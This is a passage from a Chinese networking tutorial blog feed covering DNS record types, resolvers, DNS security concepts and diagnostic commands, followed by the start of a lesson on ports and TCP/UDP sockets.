class="hljs-selector-class">.com</span>.<br><br>通常配置多个NS记录（冗余备份）<br></code></pre></td></tr></table></figure><p><strong>TXT记录</strong>：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">用途：存储文本信息（常用于验证）<br><br>配置示例：<br><br><span class="hljs-number">1</span>. SPF记录（防止邮件伪造）：<br>   example<span class="hljs-selector-class">.com</span>.  IN  TXT  <span class="hljs-string">&quot;v=spf1 mx include:_spf.google.com ~all&quot;</span><br><br><span class="hljs-number">2</span>. DKIM（邮件签名）：<br>   selector._domainkey<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span>.  IN  TXT  <span class="hljs-string">&quot;v=DKIM1; k=rsa; p=MIGfMA...&quot;</span><br><br><span class="hljs-number">3</span>. 域名验证：<br>   example<span class="hljs-selector-class">.com</span>.  IN  TXT  <span class="hljs-string">&quot;google-site-verification=rXOxyZounnZasA8Z7oaD3c14JdjS9aKSWvsR1EbUSIQ&quot;</span><br></code></pre></td></tr></table></figure><p><strong>PTR记录（反向解析）</strong>：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">用途：从IP地址查询域名<br><br>配置示例：<br><span class="hljs-number">34.216.184.93</span>.in-addr.arpa.  IN  PTR  www.example.com.<br><br>应用场景：<br>- 邮件服务器验证<br>- 安全审计<br>- 日志分析<br></code></pre></td></tr></table></figure><hr><h2 id="5-实战项目：DNS查询工具">5. 实战项目：DNS查询工具</h2><h3 id="5-1-项目功能">5.1 项目功能</h3><p>我们将实现一个DNS查询工具，支持：</p><ol><li>查询各种DNS记录类型</li><li>指定DNS服务器</li><li>显示详细的查询结果</li><li>性能分析（查询时间）</li></ol><h3 id="5-2-工具演示">5.2 工具演示</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查询A记录</span><br>python day12_dns_tool.py www.baidu.com<br><br><span class="hljs-comment"># 查询指定类型</span><br>python day12_dns_tool.py www.baidu.com MX<br><br><span class="hljs-comment"># 指定DNS服务器</span><br>python day12_dns_tool.py www.baidu.com A 8.8.8.8<br><br><span class="hljs-comment"># 查询所有记录</span><br>python day12_dns_tool.py example.com ALL<br></code></pre></td></tr></table></figure><hr><h2 id="6-知识拓展">6. 知识拓展</h2><h3 id="6-1-公共DNS服务器">6.1 公共DNS服务器</h3><p><strong>国内公共DNS</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">阿里DNS：<br><span class="hljs-bullet">- </span>223.5.5.5<br><span class="hljs-bullet">- </span>223.6.6.6<br><br>腾讯DNS：<br><span class="hljs-bullet">- </span>119.29.29.29<br><br>百度DNS：<br><span class="hljs-bullet">- </span>180.76.76.76<br><br>114DNS：<br><span class="hljs-bullet">- </span>114.114.114.114<br></code></pre></td></tr></table></figure><p><strong>国际公共DNS</strong>：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">Google</span> DNS：<br>- <span class="hljs-number">8.8.8.8</span><br>- <span class="hljs-number">8.8.4.4</span><br><br>Cloudflare DNS：<br>- <span class="hljs-number">1.1.1.1</span><br>- <span class="hljs-number">1.0.0.1</span><br><br>OpenDNS：<br>- <span class="hljs-number">208.67.222.222</span><br>- <span class="hljs-number">208.67.220.220</span><br></code></pre></td></tr></table></figure><h3 id="6-2-DNS安全问题">6.2 DNS安全问题</h3><p><strong>1. DNS劫持</strong>：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">正常流程：<br>用户 → www<span class="hljs-selector-class">.bank</span><span class="hljs-selector-class">.com</span> → 真实银行IP<br><br>被劫持：<br>用户 → www<span class="hljs-selector-class">.bank</span><span class="hljs-selector-class">.com</span> → 假冒钓鱼网站IP<br><br>防护措施：<br>- 使用可信DNS服务器<br>- 启用DNSSEC<br>- 使用HTTPS<br></code></pre></td></tr></table></figure><p><strong>2. DNS污染</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">什么是DNS污染？<br><span class="hljs-bullet">- </span>DNS服务器返回错误的IP地址<br><span class="hljs-bullet">- </span>通常是某些地区的网络审查手段<br><br>现象：<br><span class="hljs-bullet">- </span>某些网站无法访问<br><span class="hljs-bullet">- </span>访问被重定向到其他页面<br><br>解决方法：<br><span class="hljs-bullet">- </span>更换DNS服务器<br><span class="hljs-bullet">- </span>使用VPN<br><span class="hljs-bullet">- </span>使用加密DNS（DoH/DoT）<br></code></pre></td></tr></table></figure><p><strong>3. DNS放大攻击</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown">攻击原理：<br><span class="hljs-bullet">1.</span> 攻击者伪造受害者IP<br><span class="hljs-bullet">2.</span> 向DNS服务器发送查询请求<br><span class="hljs-bullet">3.</span> DNS服务器将大量响应发送给受害者<br><span class="hljs-bullet">4.</span> 造成受害者网络瘫痪<br><br>特点：<br><span class="hljs-bullet">-</span> 小请求 → 大响应（放大效应）<br><span class="hljs-bullet">-</span> 典型放大倍数：28-54倍<br></code></pre></td></tr></table></figure><h3 id="6-3-新一代DNS技术">6.3 新一代DNS技术</h3><p><strong>DoH（DNS over HTTPS）</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">传统DNS：<br>明文传输，端口53，易被监听和劫持<br><br>DoH：<br>通过HTTPS加密传输，端口443<br><span class="hljs-bullet">- </span>隐私保护<br><span class="hljs-bullet">- </span>防止劫持<br><span class="hljs-bullet">- </span>绕过某些限制<br><br>支持DoH的浏览器：<br><span class="hljs-bullet">- </span>Firefox<br><span class="hljs-bullet">- </span>Chrome<br><span class="hljs-bullet">- </span>Edge<br></code></pre></td></tr></table></figure><p><strong>DoT（DNS over TLS）</strong>：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gauss">类似DoH，但使用TLS协议<br>端口：<span class="hljs-number">853</span><br><br>区别：<br>DoH：使用HTTPS，融入正常网页流量<br><span class="hljs-built_in">DoT</span>：专用端口，易被识别和过滤<br></code></pre></td></tr></table></figure><p><strong>DNSSEC（DNS Security Extensions）</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown">功能：<br><span class="hljs-bullet">-</span> 防止DNS欺骗<br><span class="hljs-bullet">-</span> 验证DNS响应的真实性<br><span class="hljs-bullet">-</span> 使用数字签名<br><br>工作原理：<br><span class="hljs-bullet">1.</span> 权威DNS用私钥签名记录<br><span class="hljs-bullet">2.</span> 查询时验证签名<br><span class="hljs-bullet">3.</span> 确保数据未被篡改<br></code></pre></td></tr></table></figure><hr><h2 id="7-实用命令">7. 实用命令</h2><h3 id="7-1-Windows-DNS命令">7.1 Windows DNS命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看DNS缓存</span><br>ipconfig /displaydns<br><br><span class="hljs-comment"># 清除DNS缓存</span><br>ipconfig /flushdns<br><br><span class="hljs-comment"># 查看DNS配置</span><br>ipconfig /all<br><br><span class="hljs-comment"># 使用nslookup查询</span><br>nslookup www.baidu.com<br>nslookup www.baidu.com 8.8.8.8<br></code></pre></td></tr></table></figure><h3 id="7-2-Linux-Mac-DNS命令">7.2 Linux/Mac DNS命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用dig查询（推荐）</span><br>dig www.baidu.com<br>dig www.baidu.com @8.8.8.8<br>dig www.baidu.com MX<br>dig www.baidu.com +trace  <span class="hljs-comment"># 追踪完整查询过程</span><br><br><span class="hljs-comment"># 使用host命令</span><br>host www.baidu.com<br>host -t MX baidu.com<br><br><span class="hljs-comment"># 使用nslookup</span><br>nslookup www.baidu.com<br><br><span class="hljs-comment"># 清除DNS缓存（Mac）</span><br><span class="hljs-built_in">sudo</span> dscacheutil -flushcache<br><span class="hljs-built_in">sudo</span> killall -HUP mDNSResponder<br><br><span class="hljs-comment"># 查看DNS配置</span><br><span class="hljs-built_in">cat</span> /etc/resolv.conf<br></code></pre></td></tr></table></figure><hr><h2 id="8-今日练习">8. 今日练习</h2><h3 id="练习1：DNS查询分析">练习1：DNS查询分析</h3><p>使用我们的工具查询以下域名，分析结果：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">1</span>. www.baidu.<span class="hljs-keyword">com</span>（A记录）<br><span class="hljs-number">2</span>. baidu.<span class="hljs-keyword">com</span>（MX记录）<br><span class="hljs-number">3</span>. www.taobao.<span class="hljs-keyword">com</span>（CNAME记录）<br><span class="hljs-number">4</span>. qq.<span class="hljs-keyword">com</span>（NS记录）<br></code></pre></td></tr></table></figure><h3 id="练习2：DNS性能对比">练习2：DNS性能对比</h3><p>对比不同DNS服务器的查询速度：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">测试域名：www.google.com<br>测试DNS：<br><span class="hljs-bullet">- </span>本地DNS<br><span class="hljs-bullet">- </span>8.8.8.8（Google）<br><span class="hljs-bullet">- </span>223.5.5.5（阿里）<br><span class="hljs-bullet">- </span>1.1.1.1（Cloudflare）<br><br>记录每个DNS的响应时间<br></code></pre></td></tr></table></figure><h3 id="练习3：DNS追踪">练习3：DNS追踪</h3><p>手动追踪一个域名的完整解析过程：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown">域名：www.example.com<br><br>步骤：<br><span class="hljs-bullet">1.</span> 查询根DNS服务器<br><span class="hljs-bullet">2.</span> 查询.com顶级域服务器<br><span class="hljs-bullet">3.</span> 查询example.com权威服务器<br><span class="hljs-bullet">4.</span> 记录每一步的结果<br></code></pre></td></tr></table></figure><h3 id="练习4：DNS记录配置">练习4：DNS记录配置</h3><p>如果你有自己的域名，尝试配置：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> A记录：指向你的服务器<br><span class="hljs-bullet">2.</span> CNAME记录：创建子域名别名<br><span class="hljs-bullet">3.</span> MX记录：配置邮件服务器<br><span class="hljs-bullet">4.</span> TXT记录：添加网站验证信息<br></code></pre></td></tr></table></figure><hr><h2 id="9-常见问题">9. 常见问题</h2><p><strong>Q1：为什么有时候改了DNS记录，但访问还是旧的IP？</strong></p><p>A：这是因为DNS缓存。解决方法：</p><ul><li>清除本地DNS缓存</li><li>等待TTL过期</li><li>设置较短的TTL值（修改前）</li></ul><p><strong>Q2：什么时候用A记录，什么时候用CNAME？</strong></p><p>A：</p><ul><li>A记录：直接指向IP，速度快</li><li>CNAME：指向另一个域名，灵活但多一次查询</li><li>根域名（<a href="http://example.com">example.com</a>）只能用A记录</li><li>子域名（<a href="http://www.example.com">www.example.com</a>）两者都可以</li></ul><p><strong>Q3：如何选择DNS服务器？</strong></p><p>A：考虑因素：</p><ul><li>速度：选择离你近的服务器</li><li>稳定性：选择大厂的公共DNS</li><li>隐私：避免记录查询日志的DNS</li><li>功能：是否支持DoH、广告过滤等</li></ul><p><strong>Q4：DNS查询走TCP还是UDP？</strong></p><p>A：</p><ul><li>通常走UDP（端口53）</li><li>响应超过512字节时走TCP</li><li>DNSSEC、区域传输走TCP</li><li>DoH走TCP（HTTPS）</li></ul><hr><h2 id="10-总结">10. 总结</h2><p>今天我们学习了：</p><h3 id="核心知识点">核心知识点</h3><ol><li><p><strong>DNS基础</strong>：</p><ul><li>DNS是域名与IP地址的映射系统</li><li>分布式、层级化架构</li></ul></li><li><p><strong>DNS架构</strong>：</p><ul><li>根域、顶级域、二级域、子域</li><li>根服务器、TLD服务器、权威服务器、本地服务器</li></ul></li><li><p><strong>查询过程</strong>：</p><ul><li>递归查询 vs 迭代查询</li><li>多级缓存机制</li><li>TTL机制</li></ul></li><li><p><strong>记录类型</strong>：</p><ul><li>A/AAAA：地址记录</li><li>CNAME：别名记录</li><li>MX：邮件服务器</li><li>NS：域名服务器</li><li>TXT：文本信息</li></ul></li><li><p><strong>DNS安全</strong>：</p><ul><li>DNS劫持、DNS污染</li><li>DoH、DoT、DNSSEC</li></ul></li></ol><h3 id="重点回顾">重点回顾</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">DNS</span> = 互联网的<span class="hljs-string">&quot;通讯录&quot;</span><br>作用 = 域名 → <span class="hljs-built_in">IP</span>地址<br><br>架构：分布式 + 层级化<br>查询：缓存优先 + 递归查询<br>安全：加密 + 验证<br></code></pre></td></tr></table></figure><h3 id="明天预告">明天预告</h3><p><strong>第13天：DHCP协议与网络配置</strong></p><p>内容预览：</p><ul><li>DHCP工作原理</li><li>IP地址自动分配</li><li>DHCP四次握手过程</li><li>实战：DHCP服务器搭建</li></ul><hr><p><strong>继续加油！🚀</strong></p><p>今天我们深入学习了DNS协议，理解了互联网域名解析的完整流程。DNS是互联网的基础设施，几乎所有的网络访问都离不开它。掌握DNS不仅能帮你理解网络工作原理，还能在遇到网络问题时快速定位和解决。</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>11天：端口和Socket深入</title>
    <link href="/2025/11/10/11%E5%A4%A9%EF%BC%9A%E7%AB%AF%E5%8F%A3%E5%92%8CSocket%E6%B7%B1%E5%85%A5/"/>
    <url>/2025/11/10/11%E5%A4%A9%EF%BC%9A%E7%AB%AF%E5%8F%A3%E5%92%8CSocket%E6%B7%B1%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1>第11天：端口和Socket深入</h1><blockquote><p>“端口是应用程序的门牌号，Socket是网络编程的大门。”</p></blockquote><h2 id="📚-今日目标">📚 今日目标</h2><ul><li>理解端口的概念和作用</li><li>掌握端口的分类和常用端口号</li><li>深入理解Socket编程</li><li>区分TCP Socket和UDP Socket</li><li>编写端口扫描器工具</li></ul><h2 id="🎯-什么是端口？">🎯 什么是端口？</h2><h3 id="生活中的例子">生活中的例子</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns">端口 = 公司大楼的房间号<br><br>大楼地址（IP地址）：<br>北京市朝阳区某某路<span class="hljs-number">100</span>号<br><br>房间号（端口）：<br><span class="hljs-number">101</span>室 - 前台<br><span class="hljs-number">201</span>室 - 财务部<br><span class="hljs-number">301</span>室 - 技术部<br><br>访问方式：<br>找技术部 = 北京市朝阳区某某路<span class="hljs-number">100号301</span>室<br>访问网站 = <span class="hljs-number">220.181.38.148</span>:<span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p><strong>端口</strong>（Port）是传输层的概念，用于标识主机上的不同应用程序或服务。</p><h3 id="端口的作用">端口的作用</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">问题：一台电脑同时运行多个网络程序<br><span class="hljs-bullet">- </span>浏览器访问网页<br><span class="hljs-bullet">- </span>QQ聊天<br><span class="hljs-bullet">- </span>下载文件<br><span class="hljs-bullet">- </span>播放在线视频<br><br>如何区分这些数据是给哪个程序的？<br>答案：通过端口号！<br><br>数据包到达：<br>IP地址 → 找到正确的电脑<br>端口号 → 找到正确的程序<br></code></pre></td></tr></table></figure><h2 id="📊-端口的基本特征">📊 端口的基本特征</h2><h3 id="1-端口号范围">1. 端口号范围</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">端口号：<span class="hljs-number">16</span>位无符号整数<br>范围：<span class="hljs-number">0</span> - <span class="hljs-number">65535（2^16</span> - <span class="hljs-number">1</span>）<br><br>分为三类：<br></code></pre></td></tr></table></figure><h3 id="2-端口分类">2. 端口分类</h3><table><thead><tr><th>类别</th><th>范围</th><th>说明</th><th>例子</th></tr></thead><tbody><tr><td>知名端口</td><td>0-1023</td><td>系统保留，需要管理员权限</td><td>80(HTTP), 443(HTTPS), 22(SSH)</td></tr><tr><td>注册端口</td><td>1024-49151</td><td>软件厂商注册使用</td><td>3306(MySQL), 8080(HTTP代理)</td></tr><tr><td>动态/私有端口</td><td>49152-65535</td><td>客户端临时使用</td><td>随机分配</td></tr></tbody></table><h3 id="3-端口的状态">3. 端口的状态</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown">端口的三种状态：<br><br><span class="hljs-bullet">1.</span> LISTENING（监听）<br>   服务器程序正在监听，等待连接<br>   例如：Web服务器监听80端口<br><br><span class="hljs-bullet">2.</span> ESTABLISHED（已建立）<br>   连接已建立，正在通信<br>   例如：浏览器和服务器之间的连接<br><br><span class="hljs-bullet">3.</span> CLOSED（关闭）<br>   端口未被使用<br></code></pre></td></tr></table></figure><h2 id="🔢-常用端口号">🔢 常用端口号</h2><h3 id="Web服务">Web服务</h3><table><thead><tr><th>端口</th><th>协议</th><th>说明</th></tr></thead><tbody><tr><td>80</td><td>HTTP</td><td>网页浏览（明文）</td></tr><tr><td>443</td><td>HTTPS</td><td>安全网页浏览（加密）</td></tr><tr><td>8080</td><td>HTTP</td><td>HTTP代理、测试服务器</td></tr><tr><td>8443</td><td>HTTPS</td><td>HTTPS备用端口</td></tr></tbody></table><h3 id="文件传输">文件传输</h3><table><thead><tr><th>端口</th><th>协议</th><th>说明</th></tr></thead><tbody><tr><td>20</td><td>FTP-DATA</td><td>FTP数据传输</td></tr><tr><td>21</td><td>FTP</td><td>FTP控制连接</td></tr><tr><td>22</td><td>SFTP/SSH</td><td>安全文件传输</td></tr><tr><td>69</td><td>TFTP</td><td>简单文件传输</td></tr></tbody></table><h3 id="邮件服务">邮件服务</h3><table><thead><tr><th>端口</th><th>协议</th><th>说明</th></tr></thead><tbody><tr><td>25</td><td>SMTP</td><td>发送邮件</td></tr><tr><td>110</td><td>POP3</td><td>接收邮件</td></tr><tr><td>143</td><td>IMAP</td><td>邮件访问</td></tr><tr><td>465</td><td>SMTPS</td><td>SMTP加密版</td></tr><tr><td>993</td><td>IMAPS</td><td>IMAP加密版</td></tr><tr><td>995</td><td>POP3S</td><td>POP3加密版</td></tr></tbody></table><h3 id="数据库">数据库</h3><table><thead><tr><th>端口</th><th>数据库</th><th>说明</th></tr></thead><tbody><tr><td>3306</td><td>MySQL</td><td>MySQL数据库</td></tr><tr><td>5432</td><td>PostgreSQL</td><td>PostgreSQL数据库</td></tr><tr><td>1521</td><td>Oracle</td><td>Oracle数据库</td></tr><tr><td>27017</td><td>MongoDB</td><td>MongoDB数据库</td></tr><tr><td>6379</td><td>Redis</td><td>Redis缓存数据库</td></tr></tbody></table><h3 id="远程访问">远程访问</h3><table><thead><tr><th>端口</th><th>协议</th><th>说明</th></tr></thead><tbody><tr><td>22</td><td>SSH</td><td>安全外壳协议</td></tr><tr><td>23</td><td>Telnet</td><td>远程终端（不安全）</td></tr><tr><td>3389</td><td>RDP</td><td>Windows远程桌面</td></tr><tr><td>5900</td><td>VNC</td><td>虚拟网络计算</td></tr></tbody></table><h3 id="其他常用端口">其他常用端口</h3><table><thead><tr><th>端口</th><th>协议</th><th>说明</th></tr></thead><tbody><tr><td>53</td><td>DNS</td><td>域名解析</td></tr><tr><td>67/68</td><td>DHCP</td><td>动态主机配置</td></tr><tr><td>161</td><td>SNMP</td><td>简单网络管理</td></tr><tr><td>445</td><td>SMB</td><td>Windows文件共享</td></tr><tr><td>3000</td><td>Node.js</td><td>常用开发端口</td></tr><tr><td>5000</td><td>Flask</td><td>Python Flask默认</td></tr><tr><td>8000</td><td>Django</td><td>Python Django常用</td></tr></tbody></table><h2 id="🔧-Socket编程">🔧 Socket编程</h2><h3 id="什么是Socket？">什么是Socket？</h3><p><strong>Socket</strong>（套接字）是网络编程的基础接口，用于实现网络通信。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Socket = 电话机<br><br>打电话的过程：<br><span class="hljs-bullet">1.</span> 拿起电话（创建Socket）<br><span class="hljs-bullet">2.</span> 拨号（连接）<br><span class="hljs-bullet">3.</span> 说话（发送数据）<br><span class="hljs-bullet">4.</span> 听对方说（接收数据）<br><span class="hljs-bullet">5.</span> 挂断（关闭Socket）<br><br>网络通信的过程：<br><span class="hljs-bullet">1.</span> 创建Socket对象<br><span class="hljs-bullet">2.</span> 连接到服务器（TCP）或准备好（UDP）<br><span class="hljs-bullet">3.</span> 发送数据<br><span class="hljs-bullet">4.</span> 接收数据<br><span class="hljs-bullet">5.</span> 关闭Socket<br></code></pre></td></tr></table></figure><h3 id="Socket类型">Socket类型</h3><h4 id="1-TCP-Socket（流式套接字）">1. TCP Socket（流式套接字）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 特点：</span><br>- 面向连接<br>- 可靠传输<br>- 数据按序到达<br>- 适用于需要可靠传输的场景<br><br><span class="hljs-comment"># 使用场景：</span><br>- 网页浏览（HTTP/HTTPS）<br>- 文件传输（FTP）<br>- 邮件发送（SMTP）<br>- 远程登录（SSH）<br><br><span class="hljs-comment"># Python创建：</span><br><span class="hljs-keyword">import</span> socket<br>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br></code></pre></td></tr></table></figure><h4 id="2-UDP-Socket（数据报套接字）">2. UDP Socket（数据报套接字）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 特点：</span><br>- 无连接<br>- 不可靠（可能丢包）<br>- 速度快<br>- 适用于实时性要求高的场景<br><br><span class="hljs-comment"># 使用场景：</span><br>- 视频直播<br>- 语音通话<br>- 在线游戏<br>- DNS查询<br><br><span class="hljs-comment"># Python创建：</span><br><span class="hljs-keyword">import</span> socket<br>sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br></code></pre></td></tr></table></figure><h3 id="TCP-Socket编程流程">TCP Socket编程流程</h3><h4 id="服务器端">服务器端</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-number">1</span>. 创建Socket<br><span class="hljs-number">2</span>. 绑定地址和端口（<span class="hljs-keyword">bind</span>）<br><span class="hljs-number">3</span>. 监听连接（<span class="hljs-keyword">listen</span>）<br><span class="hljs-number">4</span>. 接受连接（<span class="hljs-keyword">accept</span>）<br><span class="hljs-number">5</span>. 收发数据（<span class="hljs-keyword">recv</span>/<span class="hljs-keyword">send</span>）<br><span class="hljs-number">6</span>. 关闭连接（<span class="hljs-keyword">close</span>）<br><br>┌─────────────┐<br>│ 创建Socket  │<br>└──────┬──────┘<br>       ↓<br>┌─────────────┐<br>│ 绑定端口    │ <span class="hljs-keyword">bind</span>((<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">8888</span>))<br>└──────┬──────┘<br>       